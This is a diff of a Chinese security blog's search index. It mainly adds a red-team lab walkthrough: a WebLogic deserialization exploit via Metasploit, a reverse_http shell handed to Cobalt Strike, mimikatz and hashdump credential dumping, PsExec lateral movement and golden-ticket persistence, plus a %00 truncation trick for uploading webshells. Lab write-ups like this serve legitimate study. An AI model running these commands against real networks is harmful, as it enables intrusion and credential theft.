@@ -101,9 +101,11 @@
 <p>远程访问文件</p>
 <p>成功反弹shell</p>
 <p>然后用 cobaltstrike 进行下一步操作</p>
-<blockquote>
-<h2 id="部署TeamServer"><a href="#部署TeamServer" class="headerlink" title="部署TeamServer"></a>部署TeamServer</h2><p>./teamserver &lt;你的ip&gt; &lt;密码&gt; </p>
-<h2 id="部署CobaltStrike"><a href="#部署CobaltStrike" class="headerlink" title="部署CobaltStrike"></a>部署CobaltStrike</h2><p>./start </p>
+<h2 id="部署TeamServer"><a href="#部署TeamServer" class="headerlink" title="部署TeamServer"></a>部署TeamServer</h2><blockquote>
+<p>./teamserver &lt;你的ip&gt; &lt;密码&gt; </p>
+</blockquote>
+<h2 id="部署CobaltStrike"><a href="#部署CobaltStrike" class="headerlink" title="部署CobaltStrike"></a>部署CobaltStrike</h2><blockquote>
+<p>./start </p>
 </blockquote>
 <p>然后</p>
 <blockquote>
@@ -136,29 +138,138 @@
 <p>抓到hongrisec@2020 密码</p>
 <p>接下来进行psexec传递</p>
 <p>有两种情况</p>
-<blockquote>
-<h2 id="目标机出网"><a href="#目标机出网" class="headerlink" title="目标机出网"></a>目标机出网</h2><p>获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托CobalStrike本身完成，不借助其他工具。因为是psexec传递登录，这里仅需探测445端口。（ psexec：在主机上使用服务派生会话 ）</p>
+<h2 id="目标机出网"><a href="#目标机出网" class="headerlink" title="目标机出网"></a>目标机出网</h2><blockquote>
+<p>获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托CobalStrike本身完成，不借助其他工具。因为是psexec传递登录，这里仅需探测445端口。（ psexec：在主机上使用服务派生会话 ）</p>
 <p>使用portscan命令：ip网段 — ports端口 — 扫描协议（arp、icmp、none）— 线程（实战不要过高）。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`beacon&gt; portscan 192.168.144.0/24 445 arp 200`</span><br></pre></td></tr></table></figure>
 
 <p>view-&gt;targets</p>
 <p>jump-&gt;psexec</p>
-<p> 选择之前获取到的凭据信息（明文密文均可），此处选择明文，并确定接收的Listener与主机的Session。 </p>
-<h2 id="目标机不出网"><a href="#目标机不出网" class="headerlink" title="目标机不出网"></a>目标机不出网</h2><p>实战中往往还会遇到通过某种方式，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。因为CobalStrike服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。 </p>
+<p>选择之前获取到的凭据信息（明文密文均可），此处选择明文，并确定接收的Listener与主机的Session。 </p>
+</blockquote>
+<h2 id="目标机不出网"><a href="#目标机不出网" class="headerlink" title="目标机不出网"></a>目标机不出网</h2><blockquote>
+<p>实战中往往还会遇到通过某种方式，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。因为CobalStrike服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。 </p>
 <p>选择已经上线的主机创建listener smb</p>
-<p> spawn smb </p>
-<p> 选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless)，支持导出该类型Listener对应的可执行文件或dll等。 </p>
-<p> 选择刚建立的Listener名字 </p>
+<p>spawn smb </p>
+<p>选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless)，支持导出该类型Listener对应的可执行文件或dll等。 </p>
+<p>选择刚建立的Listener名字 </p>
 <p>右键主机explore-&gt;file browser</p>
 <p>上传刚才生成的payload到当前已上线的目标机中，还需要上传另一个工具PsExec.exe。 </p>
-<p> 在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 </p>
+<p>在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 </p>
+<p>beacon&gt;shell C:\phpStudy\WWW\PsExec.exe -accepteula \192.168.52.2,192.168.52.3 -u Administrator -p hongrisec@2019 -d -c C:\phpStudy\WWW\beacon.exe</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt;shell C:\phpStudy\WWW\PsExec.exe -accepteula \\192.168.52.2,192.168.52.3 -u Administrator -p hongrisec@2019 -d -c C:\phpStudy\WWW\beacon.exe</span><br></pre></td></tr></table></figure>
-
+<p>也可以view-&gt;targets-&gt;jump-&gt;psexec</p>
+<p>监听smb</p>
+<h1 id="ATT-amp-CK红队评估实战靶场-二"><a href="#ATT-amp-CK红队评估实战靶场-二" class="headerlink" title="ATT&amp;CK红队评估实战靶场(二)"></a>ATT&amp;CK红队评估实战靶场(二)</h1><p>环境搭建完毕，扫描网段存活主机</p>
+<blockquote>
+<p>nmap -sV 192.168.111.0/24</p>
+</blockquote>
+<p>发现有</p>
+<blockquote>
+<p>192.168.111.80   80 135 139 445 1433 3389 7001</p>
+<p>192.168.111.201 135 139 445 3389</p>
+</blockquote>
+<p> 192.168.111.80尝试下7001端口，发现是weblogic服务 </p>
+<p>使用WeblogicScan.py扫描下可能存在的漏洞</p>
+<blockquote>
+<p>python3 WeblogicScan.py -u 192.168.111.80 -p 7001</p>
+<p>得到以下内容</p>
+<p>[192.168.111.80:7001] Weblogic Version Is 10.3.6.0<br>[+] [192.168.111.80:7001] Weblogic console address is exposed! The path is: <a href="http://192.168.111.80:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.111.80:7001/console/login/LoginForm.jsp</a><br>[+] [192.168.111.80:7001] Weblogic UDDI module is exposed! The path is: <a href="http://192.168.111.80:7001/uddiexplorer/" target="_blank" rel="noopener">http://192.168.111.80:7001/uddiexplorer/</a></p>
+<p>[+] [192.168.111.80:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2725</p>
+</blockquote>
+<p>可能存在cve-2019-2725</p>
+<blockquote>
+<p>用msf</p>
+<p>search weblogic</p>
+<p>use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</p>
+<p>设置option后</p>
+<p>exploit</p>
+<p>出现这个错误Exploit completed, but no session was created.</p>
+<p>发现这个payload是针对unix环境的</p>
+<p>show targets</p>
+<p>set target 1</p>
+<p>也可以使用 java 反序列化终极测试工具测试漏洞，工具地址：<a href="https://kfire.net/220.html" target="_blank" rel="noopener">https://kfire.net/220.html</a> </p>
+</blockquote>
+<p>成功getshell</p>
+<p>然后</p>
+<blockquote>
+<p>shell</p>
+<p>whoami</p>
+<p>de1ay\administrator</p>
+<p>然后查看开放端口</p>
+<p>netstat -ano</p>
+<p>查看网卡</p>
+<p>ipconfig /all</p>
+<p>得到dns服务器  10.10.10.10</p>
+<p>beacon&gt;shell net config workstation   得到登录域信息</p>
+<p>工作站域  de1ay.com</p>
+<p>beacon&gt;net view    域内主机</p>
+<p>pc 192.168.111.201</p>
+<p>web 192.168.111.80</p>
+<p>beacon&gt;shell net user /domain    域内用户</p>
+<p>Administrator   krbtgt</p>
+<p>beacon&gt;shell net group “domain controllers” /domain      查看域控制器名 </p>
+<p>DC</p>
+<p>beacon&gt;shell ping DC.de1ay.com     得到域控的ip</p>
+<p>10.10.10.10</p>
+</blockquote>
+<p>然后把msf的shell派生到cs中</p>
+<blockquote>
+<p>background</p>
+<p>use exploit/windows/local/payload_inject</p>
+<p>set payload windows/meterpreter/reverse_http</p>
+<p>set LhOST 192.168.111.128</p>
+<p>set lport 8888</p>
+<p>set session 1</p>
+<p>set disablepayloadhandler true</p>
+<p>run</p>
+</blockquote>
+<p>接着用mimikatz和hashdump抓取密码</p>
+<blockquote>
+<p>beacon&gt;logonpasswords</p>
+<p>hashdump</p>
+</blockquote>
+<p>然后进行提权</p>
+<p>用 svc-exe 提权</p>
+<blockquote>
+<p>先右键interact得到beacon</p>
+<p>右键access-&gt;elevate</p>
+<p>elevate svc-exe test</p>
+<p>得到system权限</p>
+</blockquote>
+<p>信息收集完毕后</p>
+<p>进行psexec传递</p>
+<p>先创建smb</p>
+<blockquote>
+<p>可以右键session创建</p>
+<p>也可以beacon&gt;spawn smb </p>
+<p>再进行psexec传递</p>
+<p>监听smb</p>
+</blockquote>
+<p>成功拿下域控</p>
+<h3 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h3><blockquote>
+<p>hashdump</p>
+</blockquote>
+<p>在域控获得KRBTGT账户NTLM密码哈希</p>
+<p>82dfc71b72a11ef37d663047bc2088fb</p>
+<blockquote>
+<p>logonpasswords</p>
+</blockquote>
+<p>得到SID</p>
+<p>S-1-5-21-2756371121-2868759905-3853650604</p>
+<h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p>
+<p>黄金票据的条件要求：<br>1.域名称<br>2.域的SID值<br>3.域的KRBTGT账户NTLM密码哈希<br>4.伪造用户名</p>
+<p>原理这篇 <a href="https://www.freesion.com/article/6833306427/" target="_blank" rel="noopener">https://www.freesion.com/article/6833306427/</a> 博客讲的很详细。</p>
+<p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p>
+<p>WEB机 权限机器-&gt;右键-&gt;Access-&gt;Golden Ticket</p>
+<p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E5%AE%9E%E6%88%98%E4%BA%8C%E7%BB%93%E6%9E%9C.png" alt></p>
 ]]></content>
       <categories>
         <category>笔记</category>
       </categories>
+      <tags>
+        <tag>域渗透</tag>
+      </tags>
   </entry>
   <entry>
     <title>shodan基础使用</title>
@@ -575,14 +686,6 @@
       </categories>
   </entry>
   <entry>
-    <title>渗透工具使用</title>
-    <url>/2020/06/19/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>php伪协议</title>
     <url>/2020/06/18/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
     <content><![CDATA[<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>]]></content>
@@ -958,10 +1061,10 @@
   <entry>
     <title>00截断</title>
     <url>/2020/04/21/00%E6%88%AA%E6%96%AD/</url>
-    <content><![CDATA[<p><a href="00截断原理分析">https://blog.csdn.net/qq_26090065/article/details/81458937</a> </p><h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><a id="more"></a>
+    <content><![CDATA[<p><a href="https://blog.csdn.net/qq_26090065/article/details/81458937" target="_blank" rel="noopener">00截断原理分析</a> </p><h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p>比如</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p><a id="more"></a>
 
-<p>比如</p>
-<p><a href="https://mp.csdn.net/upfiles/?filename=test.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p>
+
+
 <p>加上%00</p>
 <p><a href="https://mp.csdn.net/upfiles/?filename=test.php%00.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a>                   此时输出的是test.php</p>
 <p>就绕过了后缀限制，可以上传webshell啦。</p>
